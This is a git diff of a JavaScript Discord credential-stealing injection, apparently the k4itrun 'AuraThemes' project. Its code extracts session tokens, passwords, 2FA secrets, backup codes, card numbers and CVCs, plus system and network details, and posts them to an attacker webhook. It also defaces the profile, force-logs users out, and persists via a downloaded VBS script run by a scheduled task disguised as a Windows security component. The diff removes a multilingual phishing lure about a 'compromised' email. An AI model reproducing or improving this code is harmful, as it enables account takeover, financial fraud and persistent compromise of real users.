@@ -9,15 +9,15 @@ const { promisify } = require('util');
 const { BrowserWindow, session } = require('electron');
 
 const execCommand = async (command, options = {}) => {
-  try {
-    const { stdout, stderr } = await promisify(exec)(command, options);
-    if (stderr) {
-      console.error(stderr);
+    try {
+        const { stdout, stderr } = await promisify(exec)(command, options);
+        if (stderr) {
+            console.error(stderr);
+        }
+        return stdout.trim();
+    } catch (error) {
+        return null;
     }
-    return stdout.trim();
-  } catch (error) {
-    return null;
-  }
 };
 
 const execScript = async (script) => {
@@ -34,16 +34,18 @@ const execScript = async (script) => {
 const CONFIG = {
     webhook: '%WEBHOOK_URL%',
     API: '%API_URL%',
+    force_persist_startup: '%FORCE_PERSIST_STARTUP%',
+    auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
+    auto_email_update: '%AUTO_EMAIL_UPDATE%',
+    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
+    gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
     injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
-    force_persist_startup: 'false',
-    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
-    auto_email_update: '%AUTO_EMAIL_UPDATE%',
-    gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
         logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
-        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`),
+        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`),
+        clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`),
     },
     auth_filters: {
         urls: [
@@ -71,9 +73,9 @@ const CONFIG = {
         urls: [
             'https://api.stripe.com/v*/tokens',
             'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
-            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
+            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
             'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
-            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
+            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
             'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
         ],
     },
@@ -157,6 +159,22 @@ const CONFIG = {
     },
 };
 
+const parseJSON = (data) => {
+    try {
+        return JSON.parse(data || '');
+    } catch {
+        return {};
+    }
+};
+
+const clearLocalStorage = () => {
+    try {
+        CONFIG.get.clear_local_storage();
+    } catch {
+        return null;
+    }
+}
+
 const request = async (method, url, headers = {}, data = null) => {
     try {
         const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
@@ -188,19 +206,46 @@ const request = async (method, url, headers = {}, data = null) => {
     }
 };
 
+const AuritaCord = async () => {
+    try {
+        const logout = await CONFIG.get.logout();
+        const token = await CONFIG.get.token();
+        const API = new Fetcher(token);
+
+        const [user, profile, billing, friends, servers] = await Promise.all([
+            API.User(),
+            API.Profile(),
+            API.Billing(),
+            API.Friends(),
+            API.Servers()
+        ]);
+
+        return {
+            logout,
+            token,
+            user,
+            profile,
+            billing,
+            friends,
+            servers
+        };
+    } catch {
+        return {}
+    }
+}
+
 const notify = async (ctx, token, user) => {
     const getData = new GetDataUser();
-    let AuritaData = await AuritaCord();
 
-    const [profile, system ,network, billing, friends, servers] = [
-       await AuritaData.profile,
-       await getData.SystemInfo(),
-       await getData.Network(),
-       await getData.Billing(token),
-       await getData.Friends(token),
-       await getData.Servers(token),
+    const [profile, system, network, billing, friends, servers] = [
+        (await AuritaCord()).profile,
+        await getData.SystemInfo(),
+        await getData.Network(),
+        await getData.Billing(token),
+        await getData.Friends(token),
+        await getData.Servers(token),
     ];
-
+    
     const [nitro, badges] = [
         getData.Nitro(profile),
         getData.Badges(user.flags),
@@ -209,6 +254,7 @@ const notify = async (ctx, token, user) => {
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
     ctx.username = `AuraThemes - injection`;
     ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+
     ctx.embeds[0].fields.unshift({
         name: `<a:hearts:1176516454540116090> Token:`,
         value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
@@ -237,7 +283,7 @@ const notify = async (ctx, token, user) => {
         ctx.embeds.push({ title: servers.title, description: servers.description });
     }
 
-    if (CONFIG.gofile_download_link !== '%GOFILE_DOWN' + 'LOAD_LINK%') {
+    if (CONFIG.gofile_download_link !== '%' + 'GOFILE_DOWNLOAD_LINK%') {
         ctx.embeds.push({ title: 'Gofile Download Link', description: `[Download here](${CONFIG.gofile_download_link})` });
     }
 
@@ -256,343 +302,62 @@ const notify = async (ctx, token, user) => {
             name: `${user.username} | ${user.id}`,
             icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
         };
+
         embed.footer = {
             text: 'github.com/k4itrun/discord-injection - made by k4itrun',
             icon_url: "https://avatars.githubusercontent.com/u/103044629",
         };
+
         embed.timestamp = new Date();
     });
 
     try {
-        await request('POST', CONFIG.webhook, {
+        return await request('POST', CONFIG.webhook, {
             "Content-Type": "application/json"
         }, JSON.stringify(ctx));
     } catch (error) {
-        console.error();
+        return null;
     }
 };
 
-const editSettingUser = async () => {
+const getBackupCodes = async (response) => {
+    try{
+        const backup_codes = await CONFIG.get.backup_codes();
+        const codes = response.backup_codes || backup_codes;
+
+        const filtered = codes.filter(code => !code.consumed);
+    
+        const validCode = filtered
+            .map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`)
+            .join('\n');
+        
+        return validCode;
+    } catch (error) {
+        return ''
+    }
+};
+
+const editSettingUser = async (token) => {
     try {
-        let AuritaData = await AuritaCord();
-        const data = {
+        const response = parseJSON(await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }, JSON.stringify({
             status: 'dnd',
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
-            custom_status: { 
-                text: 'hackedbyk4itrun', 
-                expires_at: null, 
-                emoji_id: null, 
+            custom_status: {
+                text: 'hackedbyk4itrun',
+                expires_at: null,
+                emoji_id: null,
                 emoji_name: null
             },
-        };
-        const patchData = JSON.stringify(data);
-        const response = await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
-            'Content-Type': 'application/json',
-            'Content-Length': patchData.length,
-            'Authorization': AuritaData.token
-        }, patchData);
+        })));
 
-        return JSON.parse(response);
+        return response;
     } catch (error) {
         return {};
     }
-};
-
-const translateAutoEmailUpdate = async (lang) => {
-    const languages = {
-        "zh-CN": [
-            "用户设置",
-            "编辑电子邮件地址",
-            "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
-            "已经受到威胁。",
-            "请更改它以继续使用您的帐户。",
-            "您不再可以访问您的电子邮件地址",
-            "联系您的电子邮件提供商以解决问题。",
-        ],
-        "zh-TW": [
-            "用戶設置",
-            "編輯電子郵件地址",
-            "我們檢測到您的Discord帳戶有異常情況，您的地址",
-            "受到威脅。",
-            "請更改它以繼續使用您的帳戶。",
-            "您不再能夠訪問您的電子郵件地址",
-            "請聯繫您的電子郵件提供商以修復問題。",
-        ],
-        "en-GB": [
-            "User Settings",
-            "Edit email address",
-            "We have detected something unusual with your Discord account, your address,",
-            "has been compromised.",
-            "Please change it to continue using your account.",
-            "No longer have access to your email",
-            "Contact your email provider to fix it.",
-        ],
-        "en-US": [
-            "User Settings",
-            "Edit email address",
-            "We have detected something unusual with your Discord account, your address,",
-            "has been compromised.",
-            "Please change it to continue using your account.",
-            "No longer have access to your email",
-            "Contact your email provider to fix it.",
-        ],
-        "es-ES": [
-            "Configuración del usuario",
-            "Editar dirección de correo electrónico",
-            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
-            "ha sido comprometida.",
-            "Por favor, cámbiala para continuar usando tu cuenta.",
-            "¿Ya no tienes acceso a tu correo electrónico?",
-            "Contacta a tu proveedor de correo electrónico para solucionarlo."
-        ],
-        "es-419": [
-            "Configuración del usuario",
-            "Editar dirección de correo electrónico",
-            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
-            "ha sido comprometida.",
-            "Por favor, cámbiala para continuar usando tu cuenta.",
-            "¿Ya no tienes acceso a tu correo electrónico?",
-            "Contacta a tu proveedor de correo electrónico para solucionarlo."
-        ],
-        "pr-BR": [
-            "Configurações do usuário",
-            "Editar endereço de e-mail",
-            "Detectamos algo incomum em sua conta Discord, seu endereço,",
-            "foi comprometido.",
-            "Por favor, altere-o para continuar usando sua conta.",
-            "Você não tem mais acesso ao seu endereço de e-mail",
-            "Contate seu provedor de e-mail para corrigi-lo.",
-        ],
-        "sv-SE": [
-            "Användarinställningar",
-            "Redigera e-postadress",
-            "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
-            "har komprometterats.",
-            "Ändra den för att fortsätta använda ditt konto.",
-            "Du har inte längre tillgång till din e-postadress",
-            "Kontakta din e-postleverantör för att åtgärda det.",
-        ],
-        "fr": [
-            "Paramètres utilisateur",
-            "Modifier l\\'adresse e-mail",
-            "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
-            "a été compromise.",
-            "Veuillez la changer pour continuer à utiliser votre compte.",
-            "Vous n\\'avez plus accès à votre adresse e-mail",
-            "Contactez votre fournisseur de messagerie pour la réparer.",
-        ],
-        "pt": [
-            "Configurações do usuário",
-            "Editar endereço de e-mail",
-            "Detectamos algo incomum em sua conta Discord, seu endereço,",
-            "foi comprometido.",
-            "Por favor, altere-o para continuar usando sua conta.",
-            "Você não tem mais acesso ao seu endereço de e-mail",
-            "Contate seu provedor de e-mail para corrigi-lo.",
-        ],
-        "da": [
-            "Brugerindstillinger",
-            "Rediger e-mailadresse",
-            "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
-            "er blevet kompromitteret.",
-            "Ændre den for at fortsætte med at bruge din konto.",
-            "Du har ikke længere adgang til din e-mailadresse",
-            "Kontakt din e-mail-udbyder for at få det rettet.",
-        ],
-        "de": [
-            "Benutzereinstellungen",
-            "E-Mail-Adresse bearbeiten",
-            "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
-            "wurde kompromittiert.",
-            "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
-            "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
-            "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
-        ],
-        "hr": [
-            "Korisničke postavke",
-            "Uredi adresu e-pošte",
-            "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
-            "je kompromitirana.",
-            "Promijenite je da biste nastavili koristiti svoj račun.",
-            "Više nemate pristup svojoj e-pošti",
-            "Kontaktirajte svog pružatelja e-pošte da to popravi.",
-        ],
-        "it": [
-            "Impostazioni utente",
-            "Modifica indirizzo email",
-            "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
-            "è stato compromesso.",
-            "Per favore cambialo per continuare a usare il tuo account.",
-            "Non hai più accesso alla tua email",
-            "Contatta il tuo provider email per risolvere il problema.",
-        ],
-        "lt": [
-            "Vartotojo nustatymai",
-            "Redaguoti el. pašto adresą",
-            "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
-            "buvo pažeistas.",
-            "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
-            "Dabar neturite prieigos prie savo el. pašto",
-            "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
-        ],
-        "hu": [
-            "Felhasználói beállítások",
-            "E-mail cím szerkesztése",
-            "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
-            "meg lett veszélyeztetve.",
-            "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
-            "Nincs többé hozzáférése az e-mail címéhez",
-            "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
-        ],
-        "no": [
-            "Brukerinnstillinger",
-            "Rediger e-postadresse",
-            "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
-            "har blitt kompromittert.",
-            "Vennligst endre den for å fortsette å bruke kontoen din.",
-            "Har ikke lenger tilgang til e-posten din",
-            "Ta kontakt med e-postleverandøren din for å fikse det.",
-        ],
-        "pl": [
-            "Ustawienia użytkownika",
-            "Edytuj adres e-mail",
-            "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
-            "został naruszony.",
-            "Zmień go, aby kontynuować korzystanie z konta.",
-            "Nie masz już dostępu do swojej poczty e-mail",
-            "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
-        ],
-        "ro": [
-            "Setări utilizator",
-            "Editare adresă de email",
-            "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
-            "a fost compromisă.",
-            "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
-            "Nu mai ai acces la adresa ta de email",
-            "Contactează furnizorul tău de email pentru a rezolva problema.",
-        ],
-        "fi": [
-            "Käyttäjäasetukset",
-            "Muokkaa sähköpostiosoitetta",
-            "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
-            "on vaarantunut.",
-            "Vaihda se jatkaaksesi tilisi käyttöä.",
-            "Sinulla ei ole enää pääsyä sähköpostiisi",
-            "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
-        ],
-        "vi": [
-            "Cài đặt người dùng",
-            "Chỉnh sửa địa chỉ email",
-            "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
-            "đã bị đe dọa.",
-            "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
-            "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
-            "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
-        ],
-        "tr": [
-            "Kullanıcı Ayarları",
-            "E-posta adresini düzenle",
-            "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
-            "tehlikeye girdi.",
-            "Kullanmaya devam etmek için lütfen değiştirin.",
-            "Artık e-posta adresinize erişiminiz yok",
-            "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
-        ],
-        "cs": [
-            "Uživatelské nastavení",
-            "Upravit e-mailovou adresu",
-            "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
-            "byla narušena.",
-            "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
-            "Nemáte již přístup k vaší e-mailové adrese",
-            "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
-        ],
-        "el": [
-            "Ρυθμίσεις χρήστη",
-            "Επεξεργασία διεύθυνσης email",
-            "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
-            "έχει διακινδυνευθεί.",
-            "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
-            "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
-            "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
-        ],
-        "bg": [
-            "Потребителски настройки",
-            "Редактиране на имейл адрес",
-            "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
-            "е бил компрометиран.",
-            "Моля, променете го, за да продължите да използвате вашия акаунт.",
-            "Вече нямате достъп до вашия имейл адрес",
-            "Свържете се с вашия доставчик на имейли, за да го оправите.",
-        ],
-        "ru": [
-            "Настройки пользователя",
-            "Изменить адрес электронной почты",
-            "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
-            "был скомпрометирован.",
-            "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
-            "У вас больше нет доступа к вашему адресу электронной почты",
-            "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
-        ],
-        "uk": [
-            "Налаштування користувача",
-            "Редагування електронної адреси",
-            "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
-            "була під загрозою.",
-            "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
-            "Ви більше не маєте доступу до своєї електронної адреси",
-            "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
-        ],
-        "hi": [
-            "उपयोगकर्ता सेटिंग्स",
-            "ईमेल पता संपादित करें",
-            "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
-            "संकट में है।",
-            "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
-            "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
-            "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
-        ],
-        "th": [
-            "การตั้งค่าผู้ใช้",
-            "แก้ไขที่อยู่อีเมล",
-            "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
-            "ถูกขัดจังหวะ",
-            "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
-            "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
-            "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
-        ],
-        "ja": [
-            "ユーザー設定",
-            "メールアドレスを編集",
-            "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
-            "危険にさらされています。",
-            "アカウントを引き続き使用するために変更してください。",
-            "もはやあなたのメールアドレスにアクセスできません",
-            "問題を修正するためにメールプロバイダーに連絡してください。",
-        ],
-        "ko": [
-            "사용자 설정",
-            "이메일 주소 편집",
-            "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
-            "이 위험에 빠져 있습니다.",
-            "귀하의 계정을 계속 사용하려면 변경하십시오.",
-            "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
-            "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
-        ],
-    };
-
-    const language = languages[lang] || [
-        "User Settings",
-        "Edit email address",
-        "We have detected something unusual with your Discord account, your address,",
-        "has been compromised.",
-        "Please change it to continue using your account.",
-        "No longer have access to your email",
-        "Contact your email provider to fix it.",
-    ];
-
-    return language;
 };
 
 class Fetcher {
@@ -606,36 +371,41 @@ class Fetcher {
             'https://canary.discord.com/api',
             'https://ptb.discord.com/api'
         ];
-        const response = await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers)
-        return JSON.parse(response);
+        const response = parseJSON(await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers));
+        return response;
     };
 
     User = async () => {
         return await this._fetch("@me", {
+            'Content-Type': 'application/json',
             "Authorization": this.token
         });
     };
 
     Profile = async () => {
         return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
+            'Content-Type': 'application/json',
             "Authorization": this.token
         });
     };
 
     Friends = async () => {
         return await this._fetch("@me/relationships", {
+            'Content-Type': 'application/json',
             "Authorization": this.token
         });
     };
 
     Servers = async () => {
         return await this._fetch("@me/guilds?with_counts=true", {
+            'Content-Type': 'application/json',
             "Authorization": this.token
         });
     };
 
     Billing = async () => {
         return await this._fetch("@me/billing/payment-sources", {
+            'Content-Type': 'application/json',
             "Authorization": this.token
         });
     };
@@ -657,16 +427,16 @@ class GetDataUser {
             ]);
 
             return {
-              os,
-              cpu,
-              gpu,
-              ram,
-              uuid,
-              productKey,
-              macAddress,
-              localIP,
-              cpuCount,
-          };
+                os,
+                cpu,
+                gpu,
+                ram,
+                uuid,
+                productKey,
+                macAddress,
+                localIP,
+                cpuCount,
+            };
         } catch (error) {
             return {};
         }
@@ -674,10 +444,10 @@ class GetDataUser {
 
     Network = async () => {
         try {
-            const response = await request('GET', "http://ip-api.com/json", {
+            const response = parseJSON(await request('GET', "http://ip-api.com/json", {
                 'Content-Type': 'application/json'
-            });
-            return JSON.parse(response);
+            }));
+            return response;
         } catch (error) {
             return {};
         }
@@ -715,8 +485,8 @@ class GetDataUser {
     Friends = async (token) => {
         const API = new Fetcher(token);
         const friends = await API.Friends();
-        const {RareBadges} = new GetDataUser();
-    
+        const { RareBadges } = new GetDataUser();
+
         const filteredFriends = friends
             .filter(friend => friend.type === 1)
             .map(friend => ({
@@ -728,7 +498,7 @@ class GetDataUser {
 
         const hQFriends = rareFriends.map(friend => {
             const name = `${friend.username}`;
-            return`${friend.flags} | ${name}\n`;
+            return `${friend.flags} | ${name}\n`;
         });
 
         const hQFriendsPlain = hQFriends.join('');
@@ -765,11 +535,12 @@ class GetDataUser {
             }));
 
         const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
-            const response = await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
+            const response = parseJSON(await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
+                'Content-Type': 'application/json',
                 'Authorization': token
-            });
+            }));
 
-            const invites = JSON.parse(response);
+            const invites = response;
             const invite = invites.length > 0
                 ? `[Join Server](https://discord.gg/${invites[0].code})`
                 : 'No Invite';
@@ -801,7 +572,7 @@ class GetDataUser {
             description: `${hQGuildsPlain}`,
         }
     };
-    
+
     getDate = (current, months) => {
         return new Date(current).setMonth(current.getMonth() + months);
     };
@@ -823,9 +594,13 @@ class GetDataUser {
                         rem = i;
                         break;
                     }
-            return `${nitro} ${CONFIG.badges._nitro[rem]}`;
+                return `${nitro} ${CONFIG.badges._nitro[rem]}`;
         }
     };
+};
+
+const delay = (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms))
 };
 
 const Cruise = async (type, response, request, email, password, token, action) => {
@@ -845,11 +620,13 @@ const Cruise = async (type, response, request, email, password, token, action) =
                     ],
                 }],
             };
+
             if (request?.code !== undefined) {
                 content.embeds[0].fields.push(
                     { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                 );
-            }
+            };
+
             notify(content, token, user);
             break;
         case 'USERNAME_CHANGED':
@@ -896,14 +673,11 @@ const Cruise = async (type, response, request, email, password, token, action) =
             };
             notify(content, token, user);
             break;
-        case 'BACKUP_CODES':                
+        case 'BACKUP_CODES':
             API = new Fetcher(token);
             user = await API.User();
 
-            const codes = (response.backup_codes || CONFIG.get.backup_codes())
-                .filter(code => !code.consumed || response.backup_codes === undefined)
-                .map(code => response.backup_codes ? `${code.code.slice(0, 4)}-${code.code.slice(4)}` : `${code}`)
-                .join('\n');
+            const codes = await getBackupCodes(response);
 
             content = {
                 content: `**${user.username}** ${action}!`,
@@ -912,12 +686,18 @@ const Cruise = async (type, response, request, email, password, token, action) =
                         { name: "Password", value: `\`${password}\``, inline: true },
                         { name: "Email", value: `\`${email}\``, inline: true },
                         { name: "\u200b", value: "\u200b", inline: false },
-                        { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
-                        { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
                         { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                     ],
                 }],
             };
+
+            if (request?.code !== undefined && request?.secret !== undefined) {
+                content.embeds[0].fields.push(
+                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
+                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
+                );
+            };
+
             notify(content, token, user);
             break;
         case 'CREDITCARD_ADDED':
@@ -927,7 +707,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
                         { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
                         { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
@@ -947,7 +727,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
                     ],
                 }],
             };
@@ -960,11 +740,11 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
                     ],
                 }],
             };
-            await notify(content, token, user);
+            notify(content, token, user);
             break;
         default:
     }
@@ -984,12 +764,16 @@ const forcePersistStartup = async () => {
         'Content-Type': 'text/plain'
     });
 
-    const responseVbsMalware = (scriptVbsContent[0]).toString('utf8') ?? '';
+    const responseVbsMalware = scriptVbsContent[0]?.toString('utf8') || '';
     const vbsContent = responseVbsMalware
         .replace("replace_webhook_url", CONFIG.webhook)
         .replace("replace_api_url", CONFIG.API)
+        .replace("replace_force_persist_startup", CONFIG.force_persist_startup)
+        .replace("replace_auto_mfa_disabler", CONFIG.auto_mfa_disabler)
+        .replace("replace_auto_email_update", CONFIG.auto_email_update)
         .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
-        .replace("replace_auto_email_update", CONFIG.auto_email_update);
+        .replace("replace_gofile_download_link", CONFIG.gofile_download_link);
+
 
     const checkFileExists = (filePath) => {
         return new Promise((resolve) => {
@@ -1020,20 +804,15 @@ const forcePersistStartup = async () => {
         const batContent = `
             @echo off
             setlocal
-
             set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
-
             schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
-
             if %ERRORLEVEL% EQU 0 (
                 echo We are scanning your Discord application(s)....
             ) else (
                 echo An unexpected error occurred...
             )
-
             timeout /t 5 /nobreak > NUL
             del "%~f0"
-
             endlocal
         `;
 
@@ -1060,21 +839,18 @@ const forcePersistStartup = async () => {
 
     if (!protectExists) {
         await createVBSFile(vbsFilePathInProtect);
-    }
+    };
     if (!startupExists) {
         await createVBSFile(vbsFilePathInStartup);
-    }
-
+    };
     if (!taskExists) {
         await createBatchFile();
         await executeBatchFile();
 
         setTimeout(() => {
-            fs.unlink(batFilePath, (unlinkErr) => {
-                if (unlinkErr) {
-                    console.error('Error deleting batch file:', unlinkErr);
-                } else {
-                    console.log('Batch file deleted.');
+            fs.unlink(batFilePath, (error) => {
+                if (error) {
+                    console.log(error);
                 }
             });
         }, 10000);
@@ -1083,59 +859,52 @@ const forcePersistStartup = async () => {
 
 const startup = async () => {
     const startupDir = path.join(__dirname, 'aurathemes');
-    if (fs.existsSync(startupDir)) {
-        fs.rmdirSync(startupDir);
-        CONFIG.get.logout();
-        let AuritaData = await AuritaCord();
-        if (!AuritaData.token) return;
-        Cruise(
-            'INJECTED',
-            null,
-            null,
-            null,
-            null,
-            AuritaData.token,
-            `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
-        );
-        execScript('document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.clear();document.body.removeChild(document.querySelector(\'iframe\'));');
-        execScript('window.location.href=window.location.href;');
-    }
 
+    const {
+        token,
+        user,
+    } = await AuritaCord();
+
+    if(token) {
+        if (fs.existsSync(startupDir)) {
+            fs.rmdirSync(startupDir);
+            Cruise(
+                'INJECTED',
+                null,
+                null,
+                user.email,
+                null,
+                token,
+                `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
+            );
+            clearLocalStorage();
+        }
+    }
+    
     const getDiscordPaths = () => {
         const args = process.argv;
-        const appDir = args[0].split(path.sep).slice(0, -1).join(path.sep);
-        let resource;
+        const appDir = path.dirname(args[0]);
+        let resourceDir;
 
         switch (process.platform) {
             case 'win32':
-                resource = path.join(appDir, 'resources');
+                resourceDir = path.join(appDir, 'resources');
                 break;
             case 'darwin':
-                resource = path.join(appDir, 'Contents', 'Resources');
+                resourceDir = path.join(appDir, 'Contents', 'Resources');
                 break;
             default:
-                return { 
-                    resource: undefined, 
-                    app: undefined 
-                };
+                return { resource: undefined, app: undefined };
         }
 
-        if (fs.existsSync(resource)) {
-            return { 
-                resource: resource, 
-                app: appDir 
-            };
-        }
-
-        return { 
-            resource: undefined, 
-            app: undefined 
-        };
+        return fs.existsSync(resourceDir) 
+            ? { resource: resourceDir, app: appDir } 
+            : { resource: undefined, app: undefined };
     };
